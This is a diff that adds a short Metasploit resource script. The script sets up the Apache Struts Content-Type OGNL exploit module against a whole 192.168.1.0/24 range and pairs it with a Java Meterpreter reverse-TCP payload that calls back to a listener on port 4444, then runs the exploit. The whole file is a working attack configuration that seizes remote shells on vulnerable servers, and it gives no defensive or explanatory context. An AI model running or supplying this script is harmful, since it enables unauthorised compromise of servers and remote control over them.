@@ -1,0 +1,33 @@
+# Set basic configurations
+set HTTP_DELAY 60
+set PAYLOAD_REQUEST_DELAY 5
+set RPORT 8080
+set SRVHOST 0.0.0.0
+set SRVPORT 8080
+set SSL false
+set TARGETURI /struts2-blank/example/HelloWorld.action
+set WritableDir /tmp
+
+# Define RHOSTS (Target Hosts)
+# Replace with the target's IP address or range
+set RHOSTS 192.168.1.0/24
+
+# Optional configurations
+# Uncomment and configure if needed
+# set Proxies http://proxy.example.com:8080
+# set SSLCert /path/to/custom_cert.pem
+# set URIPATH /custom-uri
+# set VHOST target-virtual-host.example.com
+
+# Select the exploit module
+use exploit/multi/http/struts2_content_type_ognl
+
+# Select the payload
+set PAYLOAD java/meterpreter/reverse_tcp
+
+# Configure payload settings
+set LHOST 192.168.1.1  # Replace with your local IP address
+set LPORT 4444           # Replace with your preferred local port
+
+# Exploit
+exploit
